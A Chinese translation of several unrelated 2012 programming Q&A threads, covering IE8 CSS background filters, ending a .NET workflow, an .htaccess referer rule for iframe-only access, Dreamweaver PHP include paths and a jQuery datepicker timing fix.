> 赞同：0
> 
> 时间：2012-09-12T16:54:41.560
> 
> 标签：internet-explorer, internet-explorer-8, background, background-image, shadow

我在一个网站上工作，

在这里看到：http: [//handsomeavatar.com/test111/](http://handsomeavatar.com/test111/)

而且我无法在 IE (8) 中加载菜单的背景。

谁能帮我？

```
CSS 
.shadow {
    -webkit-box-shadow: 0 8px 6px -6px rgba(50, 50, 50, 1);
    -moz-box-shadow:    0 8px 6px -6px rgba(50, 50, 50, 1);
box-shadow:         0 8px 6px -6px rgba(50, 50, 50, 1);
filter: progid:DXImageTransform.Microsoft.Blur(PixelRadius=3,MakeShadow=true,ShadowOpacity=0.30);
    -ms-filter: "progid:DXImageTransform.Microsoft.Blur(PixelRadius=3,MakeShadow=true,ShadowOpacity=0.30)";
    zoom: 1;
}

#menu {
margin: 0 auto;
margin-top: -5px;  
width: 800px; 
background: transparent url(img/cloudy.jpg); 
height: 43px; 
-webkit-border-radius: 10px;
-moz-border-radius: 10px;
border-radius: 10px;
behavior: url(border-radius.htc);
} 
```

和 html

```
<div id="content" class="clearfix"> 
<div id="menu" class="shadow">
<ul id="navigation"> 
```

它似乎发生在我使用 .shadow 元素的任何地方。

即使我删除了课程，背景也没有出现。页面上的其他项目加载，但即使在删除之后：

```
filter: progid:DXImageTransform.Microsoft.Blur(PixelRadius=3,MakeShadow=true,ShadowOpacity=0.30);
-ms-filter: "progid:DXImageTransform.Microsoft.Blur(PixelRadius=3,MakeShadow=true,ShadowOpacity=0.30)";
 zoom: 1; 
```

菜单图像仍然没有显示（看不到背景）。

启用“过滤器：”后，您看到的只是阴影，顶部什么也没有。

需要回答的问题或问题是为什么背景没有加载。

javascript如下：

```
function navigation_open()
{   navigation_canceltimer();
navigation_close();
ddmenuitem = $(this).find('ul').eq(0).css('visibility', 'visible');}

function navigation_close()
{   if(ddmenuitem) ddmenuitem.css('visibility', 'hidden');}

function navigation_timer()
{   closetimer = window.setTimeout(navigation_close, timeout);}

function navigation_canceltimer()
{   if(closetimer)
{   window.clearTimeout(closetimer);
    closetimer = null;}}

$(document).ready(function()
{   $('#navigation > li').bind('mouseover', navigation_open);
$('#navigation > li').bind('mouseout',  navigation_timer);});' 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T20:14:52.580

不要用那个

```
-ms-filter: "progid:DXImageTransform.Microsoft.Blur(PixelRadius=3,MakeShadow=true,ShadowOpacity=0.30)"; 
```

它会产生丑陋的效果，并且不会让人们看到菜单。关于背景，有一些东西为菜单元素添加了内联样式。也许是一个 JS 文件。顺便说一句，菜单是在白色背景上，所以你不必使用背景：透明。

# .net - 从自定义代码活动中终止工作流

> ID：12392990
> 
> 赞同：1
> 
> 时间：2012-09-12T16:55:00.730
> 
> 标签：.net, workflow-foundation

是否可以从自定义代码活动中终止工作流？如果满足某些条件，我想更改我的代码活动以结束工作流，否则继续。

我找到了 System.Workflow.ComponentModel.TerminateActivity 但我想从我的自定义代码活动中调用它。

我有

```
System.Workflow.ComponentModel.TerminateActivity Terminate = new System.Workflow.ComponentModel.TerminateActivity(); 
```

但我如何执行活动？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T17:53:44.447

我看到的选项：

1.  设置可以在整个工作流程中检查的东西（例如变量），并使用常规条件分支（例如 If 活动）来决定流程。

2.  从 C#/VB 抛出一个异常，并让它漏出未被捕获

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-07-25T14:26:44.933

```
System.Activities.Statements.TerminateWorkflow terminator =
    new System.Activities.Statements.TerminateWorkflow();
terminator.Reason = "TEST"; 
```

# .htaccess - 如何阻止某人访问 iframe 之外的文件？

> ID：12392991
> 
> 赞同：1
> 
> 时间：2012-09-12T16:55:02.577
> 
> 标签：.htaccess, iframe

我正在使用 iframe 在我的页面上显示一门课程。

在线课程的文件位于[http://www.domain.com/coursefiles，iframe](http://www.domain.com/coursefiles)如下所示：

```
<iframe src="http://www.domain.com/coursefiles/index.php" width="100%" height="670"></iframe> 
```

现在，有没有人知道关于我如何拒绝直接访问课程文件夹的任何 htaccess 命令，但让用户只能通过 iframe 页面访问它？

“对不起英语不好”:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T17:34:10.337

网络服务器无法知道页面是否在 iframe 中被请求，除了使用可能被欺骗的**Referer:标头。**但是您可以通过将其放入目录中的 htaccess 文件中轻松地做到这一点`/coursefiles/`：

```
RewriteEngine On
RewriteCond %{HTTP_REFERER} !www\.domain\.com/page-where-iframe-is.html [NC]
RewriteRule ^ - [F,L] 
```

因此，除非referer 中包含a `www.domain.com/page-where-iframe-is.html`，否则将禁止访问该目录。

# php - Dreamweaver PHP 包含文件“未找到”

> ID：12392995
> 
> 赞同：0
> 
> 时间：2012-09-12T16:55:16.630
> 
> 标签：php, dreamweaver

好的，奇怪的问题。希望这很容易，我只是想念它。

我开始在 Dreamweaver 中开发一个新的 PHP 页面。在其中我引用了 3 个包含文件，其中 2 个是 required_once。

DW识别包含代码并在“源代码”之后在顶部列出文件，但是，当我尝试通过单击顶部的名称查看代码时，我得到“'文件'不在本地磁盘上。也DW 会识别这些包含文件中的任何代码。而且，是的，我已经多次验证文件夹拼写正确以及根目录在哪里。

此外，它不会发生在每一页上。同一目录中的其他页面具有完全相同的包含，工作正常。

有任何想法吗？

```
<?php require_once('/connections/TECA_DB.php'); ?>
<?php require_once('/connections/temp.php'); ?>
<?php include("/includes/header.php"); ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>

<body>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T17:15:23.850

没关系，但尝试添加“。” 在你的第一个斜杠前面，以防它没有在你的包含路径中指定。

```
<?php require_once('./connections/TECA_DB.php'); ?> 
<?php require_once('./connections/temp.php'); ?> 
<?php include("./includes/header.php"); ?> 
```

并确保保存所有文件，以便它知道相对论存在的位置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T17:22:35.700

如果您能够`.php`在浏览器中看到文件，`PHP`则服务器永远不会调用解析器。您应该无法在客户端浏览器中看到这些文件。你的文件的扩展名是什么？是`.html`吗`.php`？

# jquery - jquery datepicker 在以编程方式显示时闪烁

> ID：12392997
> 
> 赞同：-1
> 
> 时间：2012-09-12T16:55:26.347
> 
> 标签：jquery, jquery-ui, jquery-ui-datepicker

我正在尝试在表单中创建日期范围布局。我正在使用[jquery datepicker](http://jqueryui.com/demos/datepicker/)。当用户选择第一个日期时，第二个日期应该会自动打开。然而，第二个日期选择器首先闪烁，即它打开然后关闭然后再次打开。这是在 IE8/Win 中，在 FF15/Win 中，它打开然后关闭，就是这样，它消失了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T17:06:14.460

看起来是时间问题。**[尝试像这个jsFiddle 示例](http://jsfiddle.net/j08691/L4Sx3/3/)**一样通过 setTimeout 输入一个小延迟。

```
setTimeout(function(){$("#calEndDate").datepicker('show');},10); 
```